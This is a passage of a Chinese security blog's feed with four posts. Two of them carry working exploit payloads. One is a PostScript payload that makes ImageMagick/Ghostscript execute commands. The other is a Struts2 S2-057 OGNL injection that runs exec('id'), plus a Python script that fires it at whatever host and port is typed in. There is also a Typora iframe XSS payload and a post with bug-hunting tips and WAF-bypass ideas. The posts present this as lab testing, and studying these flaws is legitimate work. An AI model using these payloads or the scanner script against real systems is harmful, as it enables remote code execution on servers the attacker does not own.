    <content type="html"><![CDATA[<p>个人最喜欢的markdown查看、写作软件，因为这款软件比较简单，界面干净，而且跨平台。mac/win/linux都有</p><p>在网上发现这款软件存在XSS，经过测试触发成功。目前Mac版本为0.9.9.19.4，检查更新提示为最新版</p><p>payload：<br><code>&lt;html lang=&quot;en&quot;&gt;</code><br><code>&lt;head&gt;</code><br>    <code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code><br>    <code>&lt;title&gt;typora编辑器_测试&lt;/title&gt;</code><br>    <code>&lt;script type=&quot;text/javascript&quot;&gt;</code><br>    <code>window.parent.top.alert(&#39;exi1sh0w&#39;);</code><br><code>&lt;/script&gt;</code><br><code>&lt;/head&gt;</code><br><code>&lt;body&gt;</code><br><code>&lt;/body&gt;</code><br><code>&lt;/html&gt;</code></p><p>创建一个markdown文件，使用iframe载入：</p><p><code>&lt;iframe src=&quot;./payload.html&quot;&gt;&lt;/iframe&gt;</code></p><p>成功触发</p><p><img src="/img/typora.jpg" alt="avatar"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;个人最喜欢的markdown查看、写作软件，因为这款软件比较简单，界面干净，而且跨平台。mac/win/linux都有&lt;/p&gt;
&lt;p&gt;在网上发现这款软件存在XSS，经过测试触发成功。目前Mac版本为0.9.9.19.4，检查更新提示为最新版&lt;/p&gt;
&lt;p&gt;payload：&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ImageMagic_calc</title>
    <link href="https://www.xiaonaigou.club/2018/08/30/ImageMagic-calc/"/>
    <id>https://www.xiaonaigou.club/2018/08/30/ImageMagic-calc/</id>
    <published>2018-08-30T13:42:37.000Z</published>
    <updated>2020-01-01T05:07:49.785Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境：Ubuntu18-04"><a href="#环境：Ubuntu18-04" class="headerlink" title="环境：Ubuntu18.04"></a>环境：Ubuntu18.04</h2><p>前两天在twitter的一个大神发的…在虚拟机上测试成功…</p><p>感觉还是属于imagemagic的解析漏洞啊</p><p>貌似Discuz的图像处理用的就是这个，不知道有没有搞头，准备双休日试试看</p><p><code>%!PS</code><br><code>userdict /setpagedevice undef</code><br><code>save</code><br><code>legal</code><br><code>{ null restore } stopped { pop } if</code><br><code>{ legal } stopped { pop } if</code><br><code>restore</code><br><code>mark /OutputFile (%pipe%gnome-calculator) currentdevice putdeviceprops</code></p><p><img src="/img/calc.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境：Ubuntu18-04&quot;&gt;&lt;a href=&quot;#环境：Ubuntu18-04&quot; class=&quot;headerlink&quot; title=&quot;环境：Ubuntu18.04&quot;&gt;&lt;/a&gt;环境：Ubuntu18.04&lt;/h2&gt;&lt;p&gt;前两天在twitter的一个大神发的…在虚拟
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>漏洞挖掘与一些小工具</title>
    <link href="https://www.xiaonaigou.club/2018/08/30/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <id>https://www.xiaonaigou.club/2018/08/30/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%B7%A5%E5%85%B7/</id>
    <published>2018-08-30T13:29:14.000Z</published>
    <updated>2018-08-30T13:29:29.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、漏洞挖掘心理学"><a href="#一、漏洞挖掘心理学" class="headerlink" title="一、漏洞挖掘心理学"></a>一、漏洞挖掘心理学</h2><ol><li>安全的木桶理论</li></ol><p>找到最薄弱的那个点；</p><ol><li>有一个漏洞的站点，很可能还会有更多的漏洞</li></ol><p>开发人员的安全意识问题；</p><ol><li>存在于一个站点的漏洞，还可能存在于其他站点</li></ol><p>业务的代码复用；</p><p>通用型漏洞（wordpress插件漏洞，Discuz 更新不及时）；</p><ol><li>修复了的漏洞不一定就全部修复完整了  </li></ol><p>指哪修哪；</p><p>绕过修复；</p><ol><li>学会找扫描器扫不到/其他白帽子难发现的漏洞</li></ol><p>需要深度交互/认证；</p><p>存储XSS/CSRF/越权/逻辑漏洞；</p><ol><li>挖掘漏洞的过程</li></ol><p>通常需要先找到危险函数，然后回溯函数的调用过程，最终看在整个调用的过程中用户是否有可能控制输入；</p><ol><li>绕waf的一般思路</li></ol><p>1). 预处理利用：即设法绕过 WAF的输入验证，比如 HTTP头（ X-Originating-IP 、XForwarded-For 、X-Remote-IP 、 X-Remote-Addr）的处理，就曾多次被用于绕过公司WAF 的SQL 注入防护，或者 HTTP方法头 GET/POST 的篡改、换行符的处理等等方式；</p><p>2). 致阻断失配：利用前后端数据处理的差异，使得无法匹配到黑名单里的规则，通常结合一些参数污染、字符编码、注释符等多种方式绕过；</p><p>3). 规则集绕过：通过暴力枚举出 WAF的拦截规则，或者逆向 WAF程序获取规则，然后再设法绕过。</p><ol><li>权限与绕过思路</li></ol><p><img src="D:/My-Blog/source/pictures/vuln0.png" alt="think"></p><h2 id="二、常用的浏览器插件-Firefox"><a href="#二、常用的浏览器插件-Firefox" class="headerlink" title="二、常用的浏览器插件(Firefox)"></a>二、常用的浏览器插件(Firefox)</h2><ol><li>Firebug</li></ol><p>强大的网站调试工具，同时可以用来简单抓包</p><ol><li>Tamper data</li></ol><p>抓包修改功能</p><ol><li>Hackbar</li></ol><p>手工测试SQL注入/XSS的利器，有编码功能</p><ol><li>LiveHttpHeader</li></ol><p>抓包工具，使用方便，常用于测试CSRF</p><h2 id="三、常用的WEB安全工具"><a href="#三、常用的WEB安全工具" class="headerlink" title="三、常用的WEB安全工具"></a>三、常用的WEB安全工具</h2><ol><li>AWVS</li></ol><p>全能的Web安全漏洞扫描器，并附带有很多实用的工具</p><p>如果电脑本身需要通过代理访问外网，那么也需要设置下 application settings–application updates 设置 proxy server</p><ol><li>NetSparker</li></ol><p>对SQL注入，XSS，LFI等漏洞扫描效果不错的漏洞扫描器</p><ol><li>BurpSuite</li></ol><p>功能全面，个人常用于暴破，抓包，CSRF测试等等</p><p>需要设置浏览器代理为8080，才能捕获数据包，抓取https 包需要浏览器访问 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> 下载证书并导入。</p><p>有时电脑本身需要设置代理才能访问外网，则需要设置 Burp options–connections–upstream proxy servers</p><ol><li>Layer</li></ol><p>子域名/IP段收集，同时可过滤过出存活主机</p><ol><li>Fiddler</li></ol><p>常用的抓包工具，有XSS自动化扫描插件</p><p>打开fiddle，默认会设置浏览器的代理为fiddle 监听的8888端口，而fiddle 自己则从系统代理出口（也可以自己设置一个代理如 http=10.2.2.1:80）出去；需要设置一下才会拦截数据包，否则只是快照一下。</p><p>注意：pc 端软件发出的http/https请求也会被捕获，但私有协议（即应用层自定义包体）是抓不到的，可以用wireshark 抓到此类的包。</p><p>客户端软件发出的http/https请求有两种情况。一种类似内嵌了一个浏览器来解析html、执行js事件等，比如一个功能点，进来的原始页面（抓包）中可以搜到此功能点的一些关键字，往往就是以内嵌浏览器的方式执行js 来完成此功能，直接把入口页面复制到浏览器访问，然后console 搜索keyword。</p><p>另一种是客户端直接请求的服务端cgi，这在进来的原始页面（甚至没有入口）是找不到功能点的关键字的。</p><ol><li>Sqlmap.py</li></ol><p>数据库注入神器</p><ol><li>owasp 漏洞扫描全集<br><a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools" target="_blank" rel="noopener">Vulnerability_Scanning_Tools</a>    </li></ol><h2 id="四、github安全类repo-收集"><a href="#四、github安全类repo-收集" class="headerlink" title="四、github安全类repo 收集"></a>四、github安全类repo 收集</h2><h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></p><p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a></p><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">subbrute</a></p><p><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">altdns</a></p><p><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain</a></p><h3 id="主机指纹，第三方应用发现"><a href="#主机指纹，第三方应用发现" class="headerlink" title="主机指纹，第三方应用发现"></a>主机指纹，第三方应用发现</h3><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">whatweb</a></p><p><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">bannerscan</a></p><p><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">wyportmap</a>  </p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">wafw00f</a>  </p><h3 id="目录爆破，文件发现"><a href="#目录爆破，文件发现" class="headerlink" title="目录爆破，文件发现"></a>目录爆破，文件发现</h3><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a></p><p><a href="https://github.com/stanislav-web/OpenDoor" target="_blank" rel="noopener">OpenDoor</a></p><p><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank" rel="noopener">DirBuster</a></p><p><a href="https://github.com/henshin/filebuster" target="_blank" rel="noopener">filebuster</a></p><h3 id="敏感文件、信息泄漏"><a href="#敏感文件、信息泄漏" class="headerlink" title="敏感文件、信息泄漏"></a>敏感文件、信息泄漏</h3><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">BBScan</a></p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">htpwdScan</a></p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">Sreg</a></p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">weakfilescan</a></p><p><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">GitPrey</a></p><h3 id="弱口令扫描"><a href="#弱口令扫描" class="headerlink" title="弱口令扫描"></a>弱口令扫描</h3><p><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">F-Scrack</a></p><p><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">cupp</a></p><h3 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h3><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">sqli-hunter</a></p><h3 id="源代码审计（仅针对开发本身）"><a href="#源代码审计（仅针对开发本身）" class="headerlink" title="源代码审计（仅针对开发本身）"></a>源代码审计（仅针对开发本身）</h3><p><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">BadCode</a><br><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">cobra</a><br><a href="https://github.com/phpstan/phpstan" target="_blank" rel="noopener">phpstan</a><br><a href="https://www.owasp.org/index.php/Source_Code_Analysis_Tools" target="_blank" rel="noopener">Source_Code_Analysis_Tools</a>  </p><h3 id="源代码审计（针对第三方库依赖）"><a href="#源代码审计（针对第三方库依赖）" class="headerlink" title="源代码审计（针对第三方库依赖）"></a>源代码审计（<a href="https://techbeacon.com/13-tools-checking-security-risk-open-source-dependencies-0" target="_blank" rel="noopener">针对第三方库依赖</a>）</h3><p><a href="http://retirejs.github.io/retire.js/" target="_blank" rel="noopener">retire.js</a><br><a href="https://github.com/OSSIndex/DevAudit" target="_blank" rel="noopener">OSSIndex</a><br><a href="https://github.com/jeremylong/DependencyCheck" target="_blank" rel="noopener">DependencyCheck</a><br><a href="https://github.com/rubysec/bundler-audit" target="_blank" rel="noopener">bundler-audit</a><br><a href="https://github.com/sensiolabs/security-checker" target="_blank" rel="noopener">security-checker</a><br><a href="https://github.com/thesp0nge/dawnscanner" target="_blank" rel="noopener">dawnscanner</a><br><a href="https://github.com/nexB/scancode-toolkit" target="_blank" rel="noopener">scancode-toolkit</a>  </p><h2 id="五、一些杂项"><a href="#五、一些杂项" class="headerlink" title="五、一些杂项"></a>五、一些杂项</h2><ol><li>修复Firefox 的Live HTTP headers 无法 replay 的问题：</li></ol><p>在firfox 地址栏输入：about:support，然后进入配置文件夹</p><p>找到Live HTTP headers插件的目录，我的在~/.mozilla/firefox/df0j3s9g.default/extensions/{8f8fe09b-0bd3-4470-bc1b-8cad42b8203a}/chrome，可以看到有livehttpheaders.jar这样一个文件，用解压工具打开，进入content 目录，找到 LiveHTTPReplay.js，解压此文件，并修改。大概在32行左右，修改：</p><p><code>document.getElementById(&quot;livehttpheaders.replay.headers&quot;).value = args[4];</code></p><p>替换为：</p><p><code>document.getElementById(&quot;livehttpheaders.replay.headers&quot;).value = args[4] + &quot;If-Modified-Since: *\n&quot;;</code></p><p>修改完成后，继续用解压工具打开刚才的 livehttpheaders.jar，将修改后的LiveHTTPReplay.js 替换 livehttpheaders.jar 里的 LiveHTTPReplay.js，由于文件被修改，导致 jar 签名改变，高级版本的 firefox 会禁止加载 livehttpHeaders，对此可以 在Firefox 配置编辑器 (about:config 页面)中，更改首选项 xpinstall.signatures.required 为 false 即可。完成后重启 Firfox，replay 功能就可以使用了。</p><ol><li>爬虫  </li></ol><p>爬虫最基本的功能就是从一个页面进入，获取到url，再进一步递归访问此页面的所有url，递归多少次可以称为层数。</p><p>url基本存在形式：在本域以标签形式嵌入/拼接、在本域内以事件类被调用、在外域被以事件类调用</p><p>手工正向查找（chrome)：</p><p>进入某页面，inspect 某标签、查看某标签绑定的事件（可以在 console search event keyword）</p><p>进入某页面，触发某些按键，观察 Network 一栏发出的请求，注意看 refer 是否是当前页面</p><p>进入某页面，打开抓包软件，触发某些按键，观察发出的请求</p><p>反向验证查找与正向查找类似，但可以更便捷，进入某页面，直接在 console search url keyword </p><p>对于完全没有入口，没有被调用，或者被调用时需要一些前置步骤的情况，爬虫是没办法爬到此url 的。</p><p>在f12 出来的左侧第二栏有个 toggle device toolbar 可以模拟客户端访问网页的请求（即修改了user-agent等字段），此时某些网站会跳到为手机客户端访问的网页，如 fun.qq.com/m/ 或者 m.fun.qq.com 等形式。</p><ol><li>burpsuite 显示界面乱码问题</li></ol><ul><li>如果是中文乱码的话，解决方法：options-&gt;display-&gt;font 调成微软雅黑等中文字体就可以。</li><li>linux下中文乱码，没有微软xx字体，下载文泉驿字体，即可解决。</li></ul><ol><li>js 调试</li></ol><p>在浏览器(chrome)产生跳转的情况下，第一次返回的内容可能看不到，这时候借助抓包工具就能看到每次请求的返回情况，当然也可以在请求的瞬间按下ESC 键，停在第一次请求返回的页面上，然后在 source 那里设置下断点，F5 刷新一下，就可以跟踪调试了。preserve log 选中时有可能部分请求返回的数据没有显示出来。</p><p>console 左侧有个竖立的省略号，点开有个search 功能很好用，可以查找到 source 里面的关键词，即当前页面引用的所有js 文本都可以搜索到，对于查找ajax、事件类等才会拼接发起请求的 url 有很大帮助，同时观察下Network 一栏发出的请求。</p><p>如果想自己本地改js 代码调试，最好 ctrl+s 保存 Html 后浏览器打开文件进行调试。</p><p>注意：form action、Location header、js 中window.location.href 等最终请求时浏览器地址栏会变化；而 ajax 请求时地址栏不会变化，ajax 返回的数据一般比较少，往往只是一些状态信息。  </p><ol><li>客户端app 抓包</li></ol><p>1).笔记本电脑和手机连的同个wifi，笔记本开着 burp 监听 8888 端口，手机点击连接的wifi，高级设置中设置代理为笔记本ip:8888，这样手机的网络请求也会先通过 burp。</p><p>2).笔记本电脑自己使用猎豹wifi 等软件开启一个wifi，手机连接此wifi，且把代理设置为此wifiip:8888</p><p>同理，抓不到私有协议的包，抓取https的包需要手机访问 http://笔记本ip:8888 导入证书，不同设备需要重新导入证书（一般在设置–安全选项），有些手机暂时不支持der 格式，只能识别cer 格式，使用火狐浏览器转，导入并导出下 adb push 到手机目录就可以了。  </p><p>3）. 在 android 手机上安装 google chrome 浏览器，开启 usb 调试选项，在 桌面版chrome 输入 chrome://inspect/ 可以看到 列出来的设备如 Che2-UL00 #DU2WKN14BS004912，以及此设备通过谷歌浏览器正在访问的网页，点击 inspect 就可以在电脑上调试手机访问的页面。  </p><p>tips：下载app 时先不要挂代理，否则可能下不动。</p><ol><li>外网代理扫描和端口扫描</li></ol><p>网络设备就只有acl控制，没有iptables类似的功能，不能把端口封掉，只能对ip做权限控制。</p><p>网络做了acl控制，但是端口依然开放；nmap udp扫描会发个空udp包，如果响应icmp的回包，说明端口开放，所以做好控制，namp依然会扫出来。</p><p>影响：网络设备也存在被入侵的风险，黑客可能通过网络设备入侵到内网。  </p><p>解决方法：                                                                                                                                      </p><p>网络设备应当用独立与nmap的高危端口扫描模块，开发单独模块独立扫描。                                                                            </p><p>网络设备主要是udp协议扫描出来的，分为ntp和snmp服务；</p><p>a)    ntp服务可用ntpdata命令执行检测</p><p>b)    snmp可用snmpwalk命令执行检测</p><p>代理扫描：从外网ip 通过代理请求 内网web页面，如果能够获取页面内容说明代理能够访问内网，存在风险</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、漏洞挖掘心理学&quot;&gt;&lt;a href=&quot;#一、漏洞挖掘心理学&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞挖掘心理学&quot;&gt;&lt;/a&gt;一、漏洞挖掘心理学&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;安全的木桶理论&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;找到最薄弱的那个点；&lt;/p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>s2-057</title>
    <link href="https://www.xiaonaigou.club/2018/08/28/s2-057/"/>
    <id>https://www.xiaonaigou.club/2018/08/28/s2-057/</id>
    <published>2018-08-28T14:15:57.000Z</published>
    <updated>2020-01-01T05:10:23.569Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。"><a href="#前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。" class="headerlink" title="前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。"></a>前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。</h1><h2 id="首先搭建环境…"><a href="#首先搭建环境…" class="headerlink" title="首先搭建环境…"></a>首先搭建环境…</h2><p>使用的操作系统: ubuntu18.04</p><p>根据步骤顺利完成安装</p><p><img src="/img/s2-57/1.png" alt="imange"></p><h2 id="这边个人遇到了个小麻烦"><a href="#这边个人遇到了个小麻烦" class="headerlink" title="这边个人遇到了个小麻烦:"></a>这边个人遇到了个小麻烦:</h2><p>单纯的复制P牛给出的Payload是无法成功的(这点我测试了好几次，一度以为自己的电脑坏了，黏贴复制过程中出错…)</p><p>后来查看BurpSuite抓包内容，发现其实并没有按照复制的内容进行get请求</p><p><img src="%5Cimg%5Cs2-57%5C2.png" alt="avatar"></p><p>可以看到“（”后面的内容消失了，而测试payload是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct&#x3D;#request[&#39;struts.valueStack&#39;].context).(#cr&#x3D;#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou&#x3D;#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p>推测是因为#这个符号作怪(了解SQL注入的大佬应该了解O(∩_∩)O)</p><p>使用hackbar的URLencode模块加密，成功。</p><p><img src="/img/s2-57/3.png" alt="avatar"></p><p><img src="/img/s2-57/4.png" alt="avatar"></p><p>2018/8/30 22:34小更新一下..</p><p>主要是网上的POC都蛮复杂的，自己写了个简单的验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/struts2-showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action"</span></span><br><span class="line"></span><br><span class="line">website = input(<span class="string">"请输入url...:"</span>)</span><br><span class="line"></span><br><span class="line">port = input(<span class="string">"请输入端口..."</span>)</span><br><span class="line"></span><br><span class="line">result = website + <span class="string">":"</span> + port</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"http://"</span> <span class="keyword">not</span> <span class="keyword">in</span> website:</span><br><span class="line"></span><br><span class="line">    result = <span class="string">"http://"</span> + website + <span class="string">":"</span> + port</span><br><span class="line"></span><br><span class="line">conn = requests.options(result+payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> conn.status_code == <span class="number">200</span>:</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Oops..好像不行哦..'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。&quot;&gt;&lt;a href=&quot;#前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
